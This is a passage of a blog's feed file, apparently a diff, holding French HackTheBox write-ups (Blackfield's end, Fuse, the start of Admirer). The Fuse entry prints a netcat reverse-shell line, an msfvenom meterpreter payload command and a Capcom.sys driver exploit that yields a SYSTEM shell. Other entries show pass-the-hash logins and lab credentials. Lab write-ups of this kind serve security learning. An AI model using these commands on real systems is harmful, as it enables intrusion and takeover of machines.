+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reste à se connecter en admin à l&#39;aide du hash découvert.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&amp;gt; cd desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop&amp;gt; cat root.txt
+4375a629c7c67c8e29db269060c955cb
+*Evil-WinRM* PS C:\Users\Administrator\desktop&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Plus loin&lt;/h2&gt;
+&lt;p&gt;On peut vérifier que le compte &lt;em&gt;support&lt;/em&gt; est bien &quot;vulnérable&quot; à l&#39;attaque AR-REP Roasting. DoesNotRequirePreAuth est bien activé.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; get-aduser support -prop DoesNotRequirePreAuth
+
+DistinguishedName     : CN=support,CN=Users,DC=BLACKFIELD,DC=local
+DoesNotRequirePreAuth : True
+Enabled               : True
+GivenName             :
+Name                  : support
+ObjectClass           : user
+ObjectGUID            : ae4911cf-203d-443d-96f8-1b8d7b250d3e
+SamAccountName        : support
+SID                   : S-1-5-21-4194615774-2175524697-3563712290-1104
+Surname               :
+UserPrincipalName     :
+&lt;/code&gt;&lt;/pre&gt;</content>
+		<link href="2022-02-17-blackfield-hackthebox.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2022-02-17-blackfield-hackthebox.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>htb fuse</title>
+		<content type="html">&lt;h1&gt;htb fuse&lt;/h1&gt;
+&lt;p&gt;L&#39;art de &lt;strong&gt;l&#39;exploitation de driver signé&lt;/strong&gt; sur un OS 64 bits quand un administrateur a donné les permissions de chargé un driver (&lt;strong&gt;SeLoadDriverPrivilege&lt;/strong&gt;) à un utilisateur.&lt;/p&gt;
+&lt;h1&gt;Recon&lt;/h1&gt;
+&lt;h2&gt;nmap&lt;/h2&gt;
+&lt;p&gt;Un port web, un port ldap... Une machine windows semble-t-il.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/Fuse$ nmap -p- 10.10.10.193
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:32 EDT
+Nmap scan report for 10.10.10.193
+Host is up (0.054s latency).
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49672/tcp open  unknown
+49690/tcp open  unknown
+49745/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;ldapsearch - un domaine AD&lt;/h2&gt;
+&lt;p&gt;On a un domaine AD : fabricorp.local.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/Fuse$ ldapsearch -x -h 10.10.10.193 -s base
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:
+currentTime: 20200617072657.0Z
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fabricorp,DC=loc
+ al
+dsServiceName: CN=NTDS Settings,CN=FUSE,CN=Servers,CN=Default-First-Site-Name,
+ CN=Sites,CN=Configuration,DC=fabricorp,DC=local
+namingContexts: DC=fabricorp,DC=local
+namingContexts: CN=Configuration,DC=fabricorp,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
+namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
+namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local
+defaultNamingContext: DC=fabricorp,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
+configurationNamingContext: CN=Configuration,DC=fabricorp,DC=local
+rootDomainNamingContext: DC=fabricorp,DC=local
+...
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+dnsHostName: Fuse.fabricorp.local
+ldapServiceName: fabricorp.local:fuse$@FABRICORP.LOCAL
+serverName: CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;website - découverte de comptes users&lt;/h2&gt;
+&lt;p&gt;Sur le port 80, on a bien un site web. Je confirgure mon fichier hosts.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;http://fuse.fabricorp.local/papercut/logs/html/index.htm
+
+sudo vi /etc/hosts
+10.10.10.193    fuse.fabricorp.local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Un joli site &quot;PaperCut&quot;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200617085623377.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Dans un des fichiers CSV, je découvre quelques utilisateurs, et je pense que j&#39;ai peut être un mot de passe ici.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200617094033662.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;rcpclient - tester le mdp&lt;/h2&gt;
+&lt;p&gt;Je teste chaque utilisateur avec ce mot de passe. Pour le compte &lt;em&gt;tlavel&lt;/em&gt;, la réponse du serveur est &quot;NT&lt;em&gt;STATUS&lt;/em&gt;PASSWORD&lt;em&gt;MUST&lt;/em&gt;CHANGE&quot;. Ce qui signifie que le mot de passe est correct mais nécessite un changement.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/Fuse$ rpcclient -U &amp;quot;fabricorp\\perton&amp;quot; 10.10.10.193 
+Enter FABRICORP\perton&#39;s password: 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+
+kali@kali:~/Fuse$ rpcclient -U &amp;quot;fabricorp\\tlavel&amp;quot; 10.10.10.193 
+Enter FABRICORP\tlavel&#39;s password: 
+Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;smbpasswd - changer le mdp&lt;/h2&gt;
+&lt;p&gt;Je renouvelle le mot de passe du compte &lt;code&gt;tlavel&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/Fuse$ smbpasswd -U &amp;quot;fabricorp\\tlavel&amp;quot; -r 10.10.10.193
+Old SMB password: &amp;lt;Fabricorp01&amp;gt;
+New SMB password: &amp;lt;p@ssw0rd&amp;gt;
+Retype new SMB password: &amp;lt;p@ssw0rd&amp;gt;
+Password changed for user tlavel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;smbclient - enum des shares&lt;/h2&gt;
+&lt;p&gt;Je constate que vous avons un spooler actif sur ce contrôleur de domaine.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/fuse$ smbclient -L \\\\10.10.10.193 -U &amp;quot;fabricorp\\tlavel&amp;quot;
+Unable to initialize messaging context
+Enter FABRICORP\tlavel&#39;s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        HP-MFT01        Printer   HP-MFT01
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le mot de passe de &lt;code&gt;tlavel&lt;/code&gt; est réinitialisé très rapidement. Il faut être rapide dans les recherches. En lien avec le spooler actif, je vérifie les imprimantes connectées.&lt;/p&gt;
+&lt;h2&gt;rpcclient - enum des imprimantes&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;rpcclient $&amp;gt; enumprinters 
+        flags:[0x800000]
+        name:[\\10.10.10.193\HP-MFT01]
+        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central
+        (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        comment:[]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;La description de l&#39;imprimante contient un mot de passe, pour un compte &lt;code&gt;scan2docs&lt;/code&gt; : &lt;strong&gt;$fab@s3Rv1ce$1&lt;/strong&gt;&lt;/p&gt;
+&lt;h2&gt;rpcclient - emum des users du domaine&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;rpcclient $&amp;gt; enumdomusers
+    user:[Administrator] rid:[0x1f4]
+    user:[Guest] rid:[0x1f5]
+    user:[krbtgt] rid:[0x1f6]
+    user:[DefaultAccount] rid:[0x1f7]
+    user:[svc-print] rid:[0x450]
+    user:[bnielson] rid:[0x451]
+    user:[sthompson] rid:[0x641]
+    user:[tlavel] rid:[0x642]
+    user:[pmerton] rid:[0x643]
+    user:[svc-scan] rid:[0x645]
+    user:[bhult] rid:[0x1bbd]
+    user:[dandrews] rid:[0x1bbe]
+    user:[mberbatov] rid:[0x1db1]
+    user:[astein] rid:[0x1db2]
+    user:[dmuir] rid:[0x1db3]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Notons que le compte &lt;code&gt;svc-scan&lt;/code&gt; sera utile juste après.&lt;/p&gt;
+&lt;h1&gt;low priv shell&lt;/h1&gt;
+&lt;p&gt;Je tente d&#39;associer le mot de passe précédemment découvert au compte &lt;strong&gt;svc-print&lt;/strong&gt; et c&#39;est gagné :)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/fuse$ evil-winrm -i 10.10.10.193 -u svc-print
+Enter Password: 
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;Priv esc&lt;/h1&gt;
+&lt;h2&gt;SeLoadDriverPrivilege&lt;/h2&gt;
+&lt;p&gt;Je vérifie d&#39;abord mes privilèges. Il semblerait que je puisse charger un driver. &lt;strong&gt;SeLoadDriverPrivilege&lt;/strong&gt; comme son nom le suggère octroie la capacité de charger n&#39;importe quel driver. Et pour faire simple : être capable d&#39;insérer du code dans le kernel  = game over.&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\users\svc-print\Desktop&amp;gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+ &lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Capcom.sys Driver Exploit&lt;/h2&gt;
+&lt;p&gt;Sur les systèmes 64bits, le Kernel Mode Code Signing (KMCS) est activé, et il est &lt;strong&gt;impossible&lt;/strong&gt; de charger un driver &lt;strong&gt;non signé&lt;/strong&gt;. Il s&#39;agit là au mieux d&#39;une fonctionnalité pour assurer l&#39;intégrité du code, souvent présentée comme une fonction de sécurité. Rien empêche toutefois un attaquant de charger &lt;strong&gt;un driver signé vulnérable&lt;/strong&gt; et de l&#39;exploiter. L&#39;intégrité du kernel serait compromise.&lt;/p&gt;
+&lt;p&gt;Utilisons un driver bien connu pour être vulnérable et signé ! &lt;strong&gt;Capcom.sys&lt;/strong&gt;. Il peut être téléchargé ici :&lt;/p&gt;
+&lt;p&gt;https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys&lt;/p&gt;
+&lt;p&gt;On aura besoin de compiler ces deux exploits.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;https://github.com/tandasat/ExploitCapcom&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;ExploitCapcom.cpp&lt;/h2&gt;
+&lt;p&gt;Je modifie la ligne 292 du POC ExploitCapcom.cpp [^1] pour obtenir un reverse shell avec un netcat. Je m&#39;apercevrai plus tard que netcat ne fonctionnera pas. J&#39;utiliserai alors un meterpreter. J&#39;y reviendrai.&lt;/p&gt;
+&lt;p&gt;Modifier :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&amp;quot;C:\\Windows\\system32\\cmd.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;en :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&amp;quot;C:\\test\\nc.exe -nv 10.10.14.35 443&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et je le compile ExploitCapcom.cpp avec VS2015.&lt;/p&gt;
+&lt;h2&gt;EoPLoadDriver.cpp&lt;/h2&gt;
+&lt;p&gt;Je compile également : EoPLoadDriver.cpp [^2]. Il faut passer par un nouveau projet &lt;code&gt;Console App&lt;/code&gt; et importer le code c++.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;New &amp;gt; Project &amp;gt; Visual C++ &amp;gt; Win32 &amp;gt; Console App&lt;/li&gt;
+&lt;li&gt;Source File &amp;gt; Add &amp;gt; Existing Item&lt;/li&gt;
+&lt;li&gt;Barre d&#39;outils, choisir Release / x64&lt;/li&gt;
+&lt;li&gt;F5 pour compiler&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Préparation&lt;/h2&gt;
+&lt;p&gt;Grâce à mon shell Evil-WinRM, j&#39;upload nc.exe dans &lt;code&gt;c:\test&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\test&amp;gt; upload /usr/share/windows-resources/binaries/nc.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;J&#39;upload le driver et les deux codes compilés.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\test&amp;gt; upload Capcom.sys
+*Evil-WinRM* PS C:\test&amp;gt; upload ExploitCapcom.exe
+*Evil-WinRM* PS C:\test&amp;gt; upload eoploaddriver.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je charge le driver Capcom.sys sur la victime.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\test&amp;gt; .\eoploaddriver.exe System\CurrentControlSet\MyService c:\test\Capcom.sys
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
+NTSTATUS: 00000000, WinError: 0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;Maintenant je peux utiliser le driver chargé pour l&#39;exploiter et exécuter du code arbitraire, à savoir un reverse shell en tant que SYSTEM.&lt;/p&gt;
+&lt;p&gt;Et je lance l&#39;exploit. 1er essai avec un reverse shell netcat échoué.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\test&amp;gt; .\ExploitCapcom.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000068
+[*] Shellcode was placed at 0000029108910008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[-] CreateProcess() failed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Alors j&#39;opte pour un meterpreter.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.35 LPORT=443 -f exe &amp;gt; shell.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je modifie le code de ExploitCapcom.cpp pour appeler shell.exe&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&amp;quot;C:\\test\\shell.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;J&#39;upload shell.exe et je lance l&#39;exploit.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\test&amp;gt; upload shell.exe
+*Evil-WinRM* PS C:\test&amp;gt; .\ExploitCapcom.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000002345ED10008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched
+[*] Press any key to exit this program
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et sur mon listener metasploit, j&#39;obtiens mon reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msf5 &amp;gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
+payload =&amp;gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &amp;gt; set lhost 10.10.14.35
+lhost =&amp;gt; 10.10.14.35
+msf5 exploit(multi/handler) &amp;gt; set lport 443
+lport =&amp;gt; 443
+msf5 exploit(multi/handler) &amp;gt; run
+
+[*] Started reverse TCP handler on 10.10.14.35:443 
+[*] Sending stage (180291 bytes) to 10.10.10.193
+[*] Meterpreter session 1 opened (10.10.14.35:443 -&amp;gt; 10.10.10.193:55890) at 2020-07-01 09:56:48 -0400
+
+meterpreter &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200701161904745.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Alternative VbLoadDriver.exe&lt;/h3&gt;
+&lt;p&gt;En alternative au code EoPLoadDriver.cpp en c++, il existe une version dotnet : VbLoadDriver.exe&lt;/p&gt;
+&lt;p&gt;https://github.com/VbScrub/VbLoadDriver/raw/master/VbLoadDriver.exe&lt;/p&gt;
+&lt;p&gt;On upload... Puis il nous faut le SID de l&#39;utilisateur :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\users\svc-print\Documents&amp;gt; get-aduser svc-print
+
+
+DistinguishedName : CN=svc-print,CN=Users,DC=fabricorp,DC=local
+Enabled           : True
+GivenName         :
+Name              : svc-print
+ObjectClass       : user
+ObjectGUID        : d3482aa7-6cd7-4547-83c5-74ed2bc605fd
+SamAccountName    : svc-print
+SID               : S-1-5-21-2633719317-1471316042-3957863514-1104
+Surname           :
+UserPrincipalName :
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\users\svc-print\Documents&amp;gt; .\VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService C:\users\svc-print\Documents\capcom.sys
+VbLoadDriver
+http://vbscrub.com
+
+Attempting to enable SeLoadDriverPrivilege...
+Successfully enabled privilege
+Creating registry values...
+Successfully created registry values
+Loading driver...
+Successfully loaded driver
+*Evil-WinRM* PS C:\users\svc-print\Documents&amp;gt; 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;[^2]: https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
+[^1]: https://github.com/tandasat/ExploitCapcom&lt;/p&gt;</content>
+		<link href="2020-10-29-fuse.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2020-10-29-fuse.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>htb admirer</title>
+		<content type="html">&lt;h1&gt;htb admirer&lt;/h1&gt;
+&lt;h2&gt;Nmap&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ nmap -p- 10.10.10.187
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 08:25 EDT
+Nmap scan report for 10.10.10.187
+Host is up (0.057s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Enum web&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir -u http://10.10.10.187 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Timeout:        10s
+===============================================================
+2020/06/05 08:33:17 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/assets (Status: 301)
+/.htpasswd (Status: 403)
+/images (Status: 301)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/06/05 08:33:29 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;robots.txt laisse entrevoir une url d&#39;administration.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;assets/img/image-20200605143351223.png&quot; alt=&quot;image-20200605143351223&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Nous n&#39;avons pas d&#39;accès sur /admin-dir/.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;assets/img/image-20200605143527845.png&quot; alt=&quot;image-20200605143527845&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;La page web donne une info intéressante : le dossier contient des contacts et secrets... Creusons un peu car la directive Disallow du fichier robots.txt empêche l&#39;indexation mais pas l&#39;accès !&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187/admin-dir
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     php,bak,old,txt
+[+] Timeout:        10s
+===============================================================
+2020/06/05 08:36:36 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+...
+...
+/.hta.bak (Status: 403)
+/contacts.txt (Status: 200)
+===============================================================
+2020/06/05 08:36:56 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Un fichier contact.txt est détecté. Voici son contenu.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl -i http://10.10.10.187/admin-dir/contacts.txt
+HTTP/1.1 200 OK
+Date: Fri, 05 Jun 2020 12:38:58 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Wed, 29 Apr 2020 09:18:35 GMT
+ETag: &amp;quot;15e-5a46a6ec54540&amp;quot;
+Accept-Ranges: bytes
+Content-Length: 350
+Vary: Accept-Encoding
+Content-Type: text/plain
+
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je pousse encore l&#39;énumération web avec une liste de fichier plus importante.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.187/admin-dir
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     txt,php,bak,old
+[+] Timeout:        10s
+===============================================================
+2020/06/05 09:15:21 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htaccess.old (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.bak (Status: 403)
+/.htpasswd.old (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/contacts.txt (Status: 200)
+/credentials.txt (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Les secrets sont là dans credentials.txt ! Mauvaise idée :-)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl -i http://10.10.10.187/admin-dir/credentials.txt
+HTTP/1.1 200 OK
+Date: Fri, 05 Jun 2020 13:17:14 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Wed, 29 Apr 2020 09:11:31 GMT
+ETag: &amp;quot;88-5a46a5583b1c0&amp;quot;
+Accept-Ranges: bytes
+Content-Length: 136
+Vary: Accept-Encoding
+Content-Type: text/plain
+
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Sur le FTP on a un ce qui ressemble à un backup de site web.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
+226 Directory send OK.
+ftp&amp;gt; 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On télécharge tout ça pour investiguer.&lt;/p&gt;
+&lt;p&gt;Le backup permet de comprendre la structure du site web. On a notamment un dossier &quot;utility-scripts&quot;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Admirer$ ls -l
+total 28
+drwxr-x--- 6 kali kali 4096 Jun  6  2019 assets
+drwxr-x--- 4 kali kali 4096 Dec  2  2019 images
+-rw-r----- 1 kali kali 4613 Dec  3  2019 index.php
+-rw-r----- 1 kali kali  134 Dec  1  2019 robots.txt
+drwxr-x--- 2 kali kali 4096 Dec  2  2019 utility-scripts
+drwxr-x--- 2 kali kali 4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ce dossier contient un script d&#39;administration &quot;admin_tasks.php&quot;&lt;/p&gt;
+&lt;p&gt;http://10.10.10.187/utility-scripts/admin_tasks.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/Admirer/utility-scripts$ ls -l
+total 16
+-rw-r----- 1 kali kali 1795 Dec  2  2019 admin_tasks.php
